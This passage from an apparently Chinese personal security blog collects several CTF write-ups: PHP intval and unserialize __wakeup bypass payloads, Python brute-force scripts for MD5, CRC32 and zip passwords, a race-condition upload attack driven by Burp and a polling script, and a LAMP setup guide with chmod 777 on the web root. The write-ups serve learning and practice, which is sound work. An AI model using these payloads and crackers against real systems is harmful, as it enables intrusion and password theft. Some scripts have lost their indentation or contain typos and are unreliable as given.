利用%00绕过第一个字符串判断，然后第二个条件都是变为0再比较，下面更是满足3和4的条件</p><p>2.利用函数溢出的方法<br><code>number=2147483647%00</code><br>从这一个题目里面学到一个新点<br>那就是Intval最大的值取决于操作系统。<br>32位系统最大带符号的 integer 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。举例，在这样的系统上，<code>intval(‘1000000000000’)</code> 会返回 <code>2147483647</code>。<br>所以在第三个条件的时候翻转变成7463847412再变成整形也是<code>2147483647</code>，绕过第三个条件，第四个条件也就一起绕过了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>intval()</code>转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，<code>intval()</code>不会报错而是返回0。</p><p>所以呢现在这个intval函数我觉得的有几个点可以去利用的<br>1.溢出<br>2.16进制通常是配合<code>is_numeric()</code>使用<br>3.科学计数法<br>下面就是一个科学计数法的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-1000'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-1000'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-10'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-10'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>小结一波CTF里面可能用到的脚本</title>
      <link href="/2018/03/14/CTF-python/"/>
      <url>/2018/03/14/CTF-python/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人渣渣，只是为了总结自己的学习过程，请大佬莫喷</p><a id="more"></a><h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><p>有时候题目会让你把base全家桶用上，你就可以像下面这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">'your string'</span></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b32decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b16decode(str1)</span><br></pre></td></tr></table></figure><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><p>专门用于快速提交网页所需要的东西或者是多次访问你提交的东西<br>参考文章：<a href="http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/</a><br>一般都是下面的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'your url'</span></span><br><span class="line"></span><br><span class="line">s  = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">str1  = r.headers[<span class="string">'flag'</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]   <span class="comment">#抓包看清楚是啥才行，有可能不是flag，是其他的</span></span><br><span class="line">data = &#123;<span class="string">'key'</span>:str1&#125;</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).text</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).content</span><br></pre></td></tr></table></figure><p>有时候要你尽可能快，可能你得尽量缩小代码量达到更快的效果</p><h2 id="字符串的匹配"><a href="#字符串的匹配" class="headerlink" title="字符串的匹配"></a>字符串的匹配</h2><p>运用正则re<br>下面是一道匹配正确MD5题目所写出来的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">md51 = <span class="string">'your wrong md5'</span></span><br><span class="line">pattern = <span class="string">r'[1-9a-z]'</span></span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md51:</span><br><span class="line"><span class="keyword">if</span> re.search(pattern,i):</span><br><span class="line">str1 = str1+i</span><br><span class="line"><span class="keyword">print</span> str1</span><br></pre></td></tr></table></figure><h2 id="爆破MD5的"><a href="#爆破MD5的" class="headerlink" title="爆破MD5的"></a>爆破MD5的</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line"> a=<span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line">             b=md5.md5(a).hexdigest()</span><br><span class="line">              <span class="keyword">if</span>(b[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e9032'</span>):  </span><br><span class="line">                             <span class="keyword">print</span> b</span><br></pre></td></tr></table></figure><h3 id="md5模块的各参数"><a href="#md5模块的各参数" class="headerlink" title="md5模块的各参数"></a>md5模块的各参数</h3><p>md5.md5(s)</p><pre><code>返回字符串s的md5</code></pre><p>md5.update(arg)</p><pre><code>用string参数arg更新md5对象。即将要计算arg的消息摘要值。</code></pre><p>md5.digest()</p><pre><code>返回16字节的摘要，由传给update的string生成，摘要没有ascii字符</code></pre><p>md5.hexdigest()</p><pre><code>以16进制的形式返回摘要，32位</code></pre><p>  还有一种hashlib,这东西好像是py3只能用它了，我试了一下，好像不怎么行，跑不出答案。。。但是它功能很强大，还有sha1算法啥的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line">a = <span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line"><span class="comment">#c = hashlib.new('md5', string=a).hexdigest()</span></span><br><span class="line">b = hashlib.md5(a)</span><br><span class="line">c = b.hexdigest()</span><br><span class="line"><span class="keyword">if</span>(c[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e90032'</span>):</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><h2 id="CRC32爆破"><a href="#CRC32爆破" class="headerlink" title="CRC32爆破"></a>CRC32爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#各种打印字符</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''你的输入 '''</span>     <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</p><h2 id="进行异或运算"><a href="#进行异或运算" class="headerlink" title="进行异或运算"></a>进行异或运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">'文件路径'</span>,<span class="string">'rb'</span>)  <span class="comment"># 此处rb是指以二进制读取文件,二进制才能进行异或运算的呀233333</span></span><br><span class="line">f2 = open(<span class="string">'文件路径'</span>,<span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">""</span>.join(f1.readlines())  <span class="comment">#这里的readlines跟read差不多，readlines把全文读取后按照行的形式存进列表，所以一版一行行遍历我们用for i in f.readlines()。。而read直接简单粗暴，而readline简单读取一行,强行复习一波python</span></span><br><span class="line">b = <span class="string">""</span>.join(f2.readlines())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s= <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b):  <span class="comment">#这里的zip是指多个序列或者是迭代器的元素，组合成元组。返回的元组的长度是所有输入序列中最短的</span></span><br><span class="line">s+=chr(ord(i)^ord(j))</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h2 id="zip暴力破解"><a href="#zip暴力破解" class="headerlink" title="zip暴力破解"></a>zip暴力破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span><span class="params">(zfile,pwd)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(pwd = pwd)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'password found : %s'</span> % pwd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">zFile = zipfile.ZipFile(<span class="string">'your zip'</span>) </span><br><span class="line">passFile = open(<span class="string">'dictionary.txt'</span>) </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines(): </span><br><span class="line">password = line.strip(<span class="string">'\n'</span>) </span><br><span class="line">t = Thread(target=extractFile, args=(zFile, password)) <span class="comment">#函数性编程的影子。因为第一个参数是函数。。</span></span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>其实python真的很强大，做题的时候还是有类似一些盲注之类的题目也会用到它，只是我是菜鸡，只能凭自己理解写一下，以后希望有时间还能补充一下。。。。。。</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubantu下部署LAMP以及复现一道CTF题目</title>
      <link href="/2018/03/11/Ubantu-Web/"/>
      <url>/2018/03/11/Ubantu-Web/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午用虚拟机在Windows装配服务器。。觉得用类似phpstudy的傻瓜包太简单了，但是对比之下，Linux就值得好好记录一番了，本人渣渣，请勿喷。。。</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>通过这一次部署学会了如何搭建LAMP，还顺便还原一道CTF反序列化题目。。。</p><p>同时感谢大饼的服务器，虽然搞到后面装PHP的时候可能把他服务器有些东西搞坏了，所以我还是用自己的虚拟机模拟一遍吧，毕竟我是个新手，命令行+可视化对于初学者来说组合还是比较不错的</p><p>我用的是虚拟机下Ubuntu14.04搭建LAMP环境搭建 Apache、MySQL、PHP</p><h3 id="安装顺序："><a href="#安装顺序：" class="headerlink" title="安装顺序："></a>安装顺序：</h3><p>一般来说比较建议的顺序是Mysql Apache 最后安装PHP，PHP一定要安装在这两个后面，因为是要依赖Apache和Mysql的服务的。（反正我用快照恢复两三次）</p><p>下面的命令都是在root权限下执行的，对了，我使用的Xshell连接虚拟机的桥接模式下的乌班图，记得转到root权限啊233333</p><h3 id="MysSQL安装："><a href="#MysSQL安装：" class="headerlink" title="MysSQL安装："></a>MysSQL安装：</h3><p>打开命令行输入 ：<code>apt-get install mysql-server</code>  选择y<br>安装的期间会出现输入Mysql的管理员密码的提示，设置一下Mysql的密码即可：<br><img src="https://s1.ax1x.com/2018/05/20/CgyyWD.png" alt="CgyyWD.png"></p><p>装完后输入<code>netstat -tap | grep mysql</code> 显示监听的端口即表示安装成功</p><h3 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h3><p>在命令行输入<code>apt-get install apache2</code> 选择y<br>然后打开乌班图的浏览器输入127.0.0.1出现下面的画面就成功了<br><img src="https://s1.ax1x.com/2018/05/20/CgyROA.png" alt="CgyROA.png"></p><h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p>输入apt-get install php5 libapache2-mod-php5<br><img src="https://s1.ax1x.com/2018/05/20/CgyfeI.png" alt="CgyfeI.png"><br>不要怪我安装的版本太低。。。因为靶场有些漏洞需要低配的php</p><p>下一步很重要</p><h3 id="www目录提权"><a href="#www目录提权" class="headerlink" title="www目录提权"></a>www目录提权</h3><p>将www目录更改下所有权以便可以新建文档 输入<code>chmod 777 /var/www</code><br><img src="https://s1.ax1x.com/2018/05/20/Cgyhwt.png" alt="Cgyhwt.png"></p><p>新建一个php文件检验一下啊<br>强大的vim编辑器出来了<br>新建一个文档： <code>vi /var/www/html/phpinfo.php</code></p><p>按下i键编辑文件 输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   phpinfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ESC 后输入:wq保存退出。<br>如果还不懂一些常用的vim命令的话，可以看一下我以前写的文章<a href="https://0verwatch.top/2018/02/23/Linuxcaiji/">我以前写的文章</a></p><h3 id="重启下Apache："><a href="#重启下Apache：" class="headerlink" title="重启下Apache："></a>重启下Apache：</h3><p>输入<code>/etc/init.d/apache2 restart</code> </p><p>在乌班图的浏览器中输入 <code>127.0.0.1/phpinfo.php</code>,出现PHP的相关配置信息即表示成功<br><img src="https://s1.ax1x.com/2018/05/20/CgyIFf.png" alt="CgyIFf.png"></p><h3 id="安装相关的PHP与Mysql的扩展包："><a href="#安装相关的PHP与Mysql的扩展包：" class="headerlink" title="安装相关的PHP与Mysql的扩展包："></a>安装相关的PHP与Mysql的扩展包：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl;</span><br></pre></td></tr></table></figure><p>为了方便的管理数据库 ，安装phpmyadmin。<br>命令行输入<code>apt-get install phpmyadmin</code>,中间会出现一次输入管理密码的提示，按照提示输入即可，这里我好像输了3次密码。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgyXmn.png" alt="CgyXmn.png"></p><p>因为上面这东西默认是安装在/usr/share/下，所以你的phpmyadmin在/usr/share下可以找到<br><img src="https://s1.ax1x.com/2018/05/20/CgyvT0.png" alt="CgyvT0.png"></p><p>网上到了这一步有的人用直接复制。。。可是我尝试不行，只能显示一片空白，我也不能解决，最后只能删掉重来。。。。只能用软连接的方法，就是类似Windows的快捷方式<br><img src="https://s1.ax1x.com/2018/05/20/Cg6pfU.png" alt="Cg6pfU.png"><br>回到<code>/var/www/html</code>，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/phpmyadmin phpmyadmin</span><br></pre></td></tr></table></figure><p>打开浏览器，输入127.0.0.1/phpmyadmin，出现了熟悉的界面<br><img src="https://s1.ax1x.com/2018/05/20/CggyWT.png" alt="CggyWT.png"></p><p>到这里环境就应该配好了</p><p>下面我们就用Xftp这款工具把题目源码传上去<br><img src="https://s1.ax1x.com/2018/05/20/CggglF.png" alt="CggglF.png"></p><p>先输入ifconfig查看ip<br><img src="https://s1.ax1x.com/2018/05/20/Cgg2y4.png" alt="Cgg2y4.png"></p><p>让我们见证奇迹，回到自己的本地的浏览器<br>输入那道题目的ip，题目复现了，啊哈哈<br><img src="https://s1.ax1x.com/2018/05/20/Cggfm9.png" alt="Cggfm9.png"><br><img src="https://s1.ax1x.com/2018/05/20/CgghwR.png" alt="CgghwR.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这样想想我们其实还可以在本地输入服务器ip去检查服务器是否安装好各种环境。。。。。。。。可能这就是只有命令行时候的做法吧？？。。。现在还不清楚，可能过段时间会有更深刻的理解。。</p><p>希望学到的这些，在跟大饼的项目开发过程中能有所用途吧。。。。。。</p><p>参考文章：<br><a href="https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html</a></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境部署 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>浅析cumt平台上的一道反序列化题目</title>
      <link href="/2018/03/11/cumt-php-fanxuliehua/"/>
      <url>/2018/03/11/cumt-php-fanxuliehua/</url>
      <content type="html"><![CDATA[<h2 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h2><p>这题用了反序列化的一个漏洞，如果还不知道什么是反序列化，参考下面的文章<br><a href="http://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">http://www.freebuf.com/column/151447.html</a><br><a id="more"></a></p><p>这一题其实还是很简单的，只是我不知道php反序列化的一个漏洞，那就是<strong>PHP当序列化字符串中表示对象属性数的值大于真实的属性个数时会跳过wakeup()的执行</strong></p><p>因为我一开始构造的类是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Admin();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">print_r (serilize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后得到 <code>data=O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>然后发现是这个样子的<br><img src="https://s1.ax1x.com/2018/05/20/CghKa9.png" alt="CghKa9.png"><br>肯定是在序列化的时候<strong>wakeup()函数在搞鬼，后面加了1.。。。<br>其实这段代码主要是利用了_</strong>destruct()函数把文件内容会显示出来<br>于是就利用上面说的那一个漏洞改一下payload：data=O:5:”Admin”:2:{s:4:”file”;s:8:”flag.php”;}<br>flag就出来了<br><img src="https://s1.ax1x.com/2018/05/20/CghM5R.png" alt="CghM5R.png"></p><p>看来自己对于反序列化还是了解甚小，不得不承认自己还是个菜鸡，参考博文<br><a href="http://www.voidcn.com/article/p-ybezdnbn-bmu.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ybezdnbn-bmu.html</a><br><a href="https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单小结一下Web条件竞争的题目</title>
      <link href="/2018/03/10/RaceConditionsSummary/"/>
      <url>/2018/03/10/RaceConditionsSummary/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在做我们学校平台的一个题目的时候，突然发现了一个新知识。。。。。可能我是菜鸡吧，大佬们请忽视</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这个知识点叫条件竞争。。。<br>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。<br>简单点理解就是在你要做一件事情的时候用很快的速度插了个队并做了另外一件事，一旦这件事情有害就会导致严重后果！！！</p><p>这里有篇文章还是讲得很好的，可以参考一下：<br><a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank" rel="noopener">http://wiki.secbug.net/web_race-condtion.html</a></p><p>下面是最近做的几道题目</p><h3 id="cumt平台上的-上传三"><a href="#cumt平台上的-上传三" class="headerlink" title="cumt平台上的 上传三"></a>cumt平台上的 <a href="http://202.119.201.199/challenge/web/uploadfile/" target="_blank" rel="noopener">上传三</a></h3><p>这一个题目在前两个题目绕过的基础上<br>发现要绕过后台黑名单，但是我们知道黑名单一般都不安全，我们一般用白名单。。。。。<br>既然他说php后缀是黑名单，我们尝试一下php的别名php1,php2….当一直试到phtml的时候，抓的包就有区别了，刚开始还不知道，这里想干啥，此处感谢骆骆大佬。让我知道这叫条件竞争<br><img src="https://s1.ax1x.com/2018/05/20/CggldI.png" alt="CggldI.png"><br>于是有了下面的操作<br>抓包发送到Intruder模块开20线程不断发包，然后写一个python脚本不断去访问那个文件，其实这个访问也可以用bp完成。。。<br><img src="https://s1.ax1x.com/2018/05/20/CggGJf.png" alt="CggGJf.png"><br>下面是python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'你的文件路径'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'moctf'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CggJW8.png" alt="CggJW8.png"></p><h3 id="moctf上的-没时间解释"><a href="#moctf上的-没时间解释" class="headerlink" title="moctf上的 没时间解释"></a>moctf上的<a href="https://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener"> 没时间解释</a></h3><p>这一题给了三个提示，但是最后考的点还是条件竞争<br>首先的302这个问题最好的的解决方案就是抓包<br>抓包发现<br><img src="https://s1.ax1x.com/2018/05/20/CggNQg.png" alt="CggNQg.png"><br>然后访问是一个文件的上传页面，输入的内容与你传送的内容一致。从url可以看得出来<br><img src="https://s1.ax1x.com/2018/05/20/Cggwes.png" alt="Cggwes.png"><br>于是随便写点东西上传，当然你也可以写一句话木马。。。。<br>出现文件路径，而且改变文件名字上传文件路径还是一样的，于是就尝试访问<br><img src="https://s1.ax1x.com/2018/05/20/Cgg0wn.png" alt="Cgg0wn.png"><br>出现too slow字样。。。跟cumt的那一题的删除很是类似了<br>然后我们就用bp把它跑出来，虽然最后的提示是脚本，但是不想写了，就直接用bp吧<br><img src="https://s1.ax1x.com/2018/05/20/CggrF0.png" alt="CggrF0.png"><br>最后得到flag。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CggsYV.png" alt="CggsYV.png"></p><h2 id="最后再吐槽一两句话"><a href="#最后再吐槽一两句话" class="headerlink" title="最后再吐槽一两句话"></a>最后再吐槽一两句话</h2><p>今天的N1CTF自己去划了一波水，心累，只会做一道签到题，看来还是一个渣渣，得继续虚心学习啊！！！</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记录一下Hash长度扩展攻击的几个题目</title>
      <link href="/2018/03/09/hash-length-attack/"/>
      <url>/2018/03/09/hash-length-attack/</url>
